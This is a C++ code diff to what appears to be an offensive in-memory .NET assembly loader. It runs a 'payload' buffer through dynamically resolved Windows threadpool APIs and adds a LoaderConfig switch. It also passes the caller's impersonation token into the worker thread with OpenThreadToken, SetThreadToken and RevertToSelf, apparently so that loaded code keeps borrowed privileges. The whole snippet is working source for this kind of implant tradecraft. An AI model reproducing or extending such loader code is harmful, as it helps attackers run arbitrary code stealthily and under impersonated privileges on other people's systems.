@@ -11,23 +11,40 @@ static VOID NTAPI tp_callback(void* Instance, void* Context, void* Work) {
     TpCallbackContext* ctx = reinterpret_cast<TpCallbackContext*>(Context);
     if (!ctx) return;
 
+    if (ctx->token) {
+        SetThreadToken(nullptr, static_cast<HANDLE>(ctx->token));
+    }
+
     CoInitializeEx(nullptr, COINIT_MULTITHREADED);
-    ctx->success = execute_assembly(ctx->payload, ctx->payload_size, ctx->args, ctx->argc);
+    ctx->success = execute_assembly(ctx->payload, ctx->payload_size,
+                                    ctx->args, ctx->argc, ctx->config);
     CoUninitialize();
+
+    if (ctx->token) {
+        RevertToSelf();
+    }
+
     ctx->completed = true;
 }
 
 bool execute_via_threadpool(unsigned char* payload, size_t payload_size,
-                            const char** args, int argc) {
-    if (!g_apis.pTpAllocWork || !g_apis.pTpPostWork || !g_apis.pTpReleaseWork) {
-        return execute_assembly(payload, payload_size, args, argc);
+                            const char** args, int argc,
+                            const LoaderConfig* config) {
+    if (config->no_threadpool ||
+        !g_apis.pTpAllocWork || !g_apis.pTpPostWork || !g_apis.pTpReleaseWork) {
+        return execute_assembly(payload, payload_size, args, argc, config);
     }
+
+    HANDLE token = nullptr;
+    OpenThreadToken(GetCurrentThread(), TOKEN_IMPERSONATE, TRUE, &token);
 
     TpCallbackContext ctx = {};
     ctx.payload = payload;
     ctx.payload_size = payload_size;
     ctx.args = args;
     ctx.argc = argc;
+    ctx.config = config;
+    ctx.token = token;
     ctx.success = false;
     ctx.completed = false;
 
@@ -38,7 +55,8 @@ bool execute_via_threadpool(unsigned char* payload, size_t payload_size,
         nullptr);
 
     if (status != 0 || !pWork) {
-        return execute_assembly(payload, payload_size, args, argc);
+        if (token) CloseHandle(token);
+        return execute_assembly(payload, payload_size, args, argc, config);
     }
 
     g_apis.pTpPostWork(pWork);
@@ -48,6 +66,7 @@ bool execute_via_threadpool(unsigned char* payload, size_t payload_size,
     }
 
     g_apis.pTpReleaseWork(pWork);
+    if (token) CloseHandle(token);
 
     return ctx.success;
 }
